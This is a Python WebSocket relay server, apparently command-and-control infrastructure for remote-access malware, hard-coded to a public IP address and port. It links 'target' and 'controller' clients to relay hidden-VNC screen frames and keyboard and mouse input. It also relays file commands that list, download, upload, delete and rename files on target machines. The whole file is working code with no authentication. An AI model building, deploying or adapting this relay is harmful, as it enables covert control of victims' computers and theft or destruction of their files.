#!/usr/bin/env python3
"""
VNC & File Manager Relay Server - Lightweight WebSocket relay for hVNC and File Operations
Runs on: 51.83.6.5:20113

Protocol Types:
- 0x01: CONNECT (session establishment)
- 0x02: DATA (VNC frames: target -> controller)
- 0x03: CONTROL (keyboard/mouse: controller -> target)
- 0x04: FILE_CMD (file commands: controller -> target)
- 0x05: FILE_RESPONSE (file responses: target -> controller)
"""

import sys
import subprocess
import os

# Auto-install dependencies
def install_requirements():
    """Auto-install required packages"""
    required_packages = ['websockets']
    
    for package in required_packages:
        try:
            __import__(package)
            print(f"[✓] {package} already installed")
        except ImportError:
            print(f"[*] Installing {package}...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
                print(f"[✓] {package} installed successfully")
            except subprocess.CalledProcessError:
                print(f"[!] Failed to install {package}")
                print(f"[!] Please run: pip3 install {package}")
                sys.exit(1)

# Install requirements before importing
print("[*] Checking dependencies...")
install_requirements()

import asyncio
import websockets
import json
from collections import defaultdict

# Store connected clients
clients = {}  # client_id -> websocket
sessions = {}  # target_id -> controller_id

async def handle_client(websocket):
    """Handle WebSocket client connection"""
    client_id = None
    try:
        # Get client info from first message
        init_msg = await websocket.recv()
        
        if isinstance(init_msg, str):
            data = json.loads(init_msg)
            client_id = data.get('id')
            role = data.get('role', 'unknown')  # 'target' or 'controller'
            
            # Allow overwrite - new connection replaces old one
            if client_id in clients:
                print(f"[~] Client reconnected: {client_id} ({role})")
            else:
                print(f"[+] Client connected: {client_id} ({role})")
            
            clients[client_id] = websocket
            
            # Auto-establish session for file operations
            if role == 'target':
                sessions[client_id] = None  # Will be filled when controller connects
            
            # Send ACK
            await websocket.send(json.dumps({'status': 'connected', 'id': client_id}))
        
        # Handle messages
        async for message in websocket:
            if isinstance(message, bytes):
                # Binary message - VNC frame data
                msg_type = message[0]
                
                if msg_type == 0x01:  # CONNECT
                    target_id = message[1:37].decode('utf-8').strip()
                    sessions[target_id] = client_id
                    print(f"[+] Session: {target_id} -> {client_id}")
                
                elif msg_type == 0x02:  # DATA (target -> controller frames)
                    target_id = message[1:37].decode('utf-8').strip()
                    if target_id in sessions:
                        controller_id = sessions[target_id]
                        if controller_id in clients:
                            await clients[controller_id].send(message[37:])
                
                elif msg_type == 0x03:  # CONTROL (controller -> target input)
                    target_id = message[1:37].decode('utf-8').strip()
                    if target_id in clients:
                        await clients[target_id].send(message[37:])
                
                elif msg_type == 0x04:  # FILE_CMD (controller -> target file commands)
                    target_id = message[1:37].decode('utf-8').strip()
                    if target_id in clients:
                        # Forward file command to target
                        await clients[target_id].send(message[37:])
                        print(f"[+] File command forwarded to {target_id}")
                
                elif msg_type == 0x05:  # FILE_RESPONSE (target -> controller file response)
                    target_id = message[1:37].decode('utf-8').strip()
                    if target_id in sessions:
                        controller_id = sessions[target_id]
                        if controller_id in clients:
                            await clients[controller_id].send(message[37:])
                            print(f"[+] File response forwarded to controller")
            
            elif isinstance(message, str):
                # JSON control message or file operation
                if not message.strip():
                    continue  # Skip empty messages
                    
                print(f"[DEBUG] Received text message from {client_id}: {message[:200] if len(message) > 200 else message}")
                
                try:
                    data = json.loads(message)
                    cmd = data.get('cmd')
                    
                    if cmd == 'connect':
                        target_id = data.get('target_id')
                        sessions[target_id] = client_id
                        print(f"[+] Session: {target_id} -> {client_id}")
                        await websocket.send(json.dumps({'status': 'session_created'}))
                    
                    elif cmd == 'ping':
                        await websocket.send(json.dumps({'status': 'pong'}))
                    
                    # File operations - forward to target or controller
                    elif cmd in ['LIST_DRIVES', 'LIST_DIR', 'DOWNLOAD', 'UPLOAD', 'DELETE', 'RENAME']:
                        # This is from controller, forward to target
                        target_id = data.get('target_id')
                        if target_id and target_id in clients:
                            # Establish session if not exists
                            if target_id not in sessions or sessions[target_id] is None:
                                sessions[target_id] = client_id
                                print(f"[+] File session established: {target_id} <-> {client_id}")
                            
                            await clients[target_id].send(message)
                            print(f"[+] File command '{cmd}' forwarded to {target_id}")
                        else:
                            print(f"[!] Target {target_id} not found in clients: {list(clients.keys())}")
                            await websocket.send(json.dumps({'status': 'ERROR', 'message': f'Target {target_id} not connected'}))
                    
                    elif cmd in ['DRIVES', 'DIR', 'FILE_CHUNK'] or ('status' in data and cmd not in ['connect', 'ping']):
                        # This is response from target, forward to controller
                        # Find controller for this target (client_id is the target)
                        if client_id in sessions and sessions[client_id]:
                            controller_id = sessions[client_id]
                            if controller_id in clients:
                                await clients[controller_id].send(message)
                                print(f"[+] File response '{cmd}' forwarded to controller {controller_id}")
                        else:
                            print(f"[!] No controller found for target {client_id}")
                
                except json.JSONDecodeError as e:
                    # Not JSON - might be raw data, ignore or log
                    print(f"[!] Invalid JSON from {client_id}: {message[:100] if len(message) < 100 else message[:100] + '...'}")
                    print(f"[!] JSON Error: {e}")
                except Exception as e:
                    print(f"[!] Error handling message from {client_id}: {e}")
    
    except websockets.exceptions.ConnectionClosed:
        pass
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        # Cleanup
        if client_id:
            if client_id in clients:
                del clients[client_id]
            
            # Remove sessions
            to_remove = [k for k, v in sessions.items() if v == client_id]
            for k in to_remove:
                del sessions[k]
            
            print(f"[-] Client disconnected: {client_id}")

async def main():
    print("=" * 60)
    print("VNC & File Manager Relay Server v2.0")
    print("=" * 60)
    print("[*] Starting on 0.0.0.0:20113")
    
    async with websockets.serve(
        handle_client,
        "0.0.0.0",
        20113,
        max_size=10 * 1024 * 1024,  # 10MB max message size
        ping_interval=30,
        ping_timeout=10
    ):
        print("[+] Server started successfully")
        print("[+] Listening on ws://51.83.6.5:20113")
        print("[*] Press Ctrl+C to stop")
        print("=" * 60)
        await asyncio.Future()  # Run forever

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Server stopped by user")
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        sys.exit(1)
